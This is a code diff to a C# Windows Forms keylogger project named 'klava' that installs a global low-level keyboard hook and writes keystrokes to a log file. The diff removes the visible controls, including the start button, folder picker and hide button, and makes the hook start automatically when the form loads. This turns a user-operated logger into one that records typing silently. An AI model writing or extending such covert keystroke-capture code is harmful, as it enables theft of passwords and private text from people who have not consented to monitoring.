@@ -8,21 +8,18 @@ using System.Configuration;
 
 namespace klava
 {
-    public partial class Form1 : Form
+    public partial class Form2 : Form
     {
         public static string name = ConfigurationManager.AppSettings.Get("name");
-        public static string pathtmp = Application.StartupPath;
         public static string loggerPath = Application.StartupPath + @"\log-" + name + ".txt";
-        public Form1()
+        public Form2()
         {
             InitializeComponent();
-            label1.Text = Application.StartupPath + @"\log-" + name + ".txt";
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void Form2_Load(object sender, EventArgs e)
         {
             _hookID = SetHook(_proc);
-            button1.Enabled = false;
         }
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -31,7 +28,6 @@ namespace klava
                 return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
             }
         }
-
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -103,7 +99,6 @@ namespace klava
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
-
         private static string KeyboardLayout(uint vkCode)
         {
             try
@@ -119,7 +114,6 @@ namespace klava
             catch { }
             return ((Keys)vkCode).ToString();
         }
-
         #region "Магия захвата"
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
@@ -162,40 +156,5 @@ namespace klava
         [DllImport("user32.dll")]
         static extern uint MapVirtualKey(uint uCode, uint uMapType);
         #endregion
-
-        private void button2_Click(object sender, EventArgs e)
-        {
-            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
-            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
-            {
-                loggerPath = folderBrowserDialog.SelectedPath + @"\log-" + name + ".txt";
-                label1.Text = folderBrowserDialog.SelectedPath + @"\log-" + name + ".txt";
-                pathtmp = folderBrowserDialog.SelectedPath;
-            }
-        }
-
-        private void button3_Click(object sender, EventArgs e)
-        {
-            name = textBox1.Text;
-            label1.Text = pathtmp + @"\log-" + name + ".txt";
-            button1.Enabled = true;
-            button2.Enabled = true;
-            button5.Enabled = true;
-        }
-
-        private void button4_Click(object sender, EventArgs e)
-        {
-            Application.Restart();
-        }
-
-        private void button5_Click(object sender, EventArgs e)
-        {
-            this.Hide();
-        }
-
-        private void Form1_Load(object sender, EventArgs e)
-        {
-
-        }
     }
 }
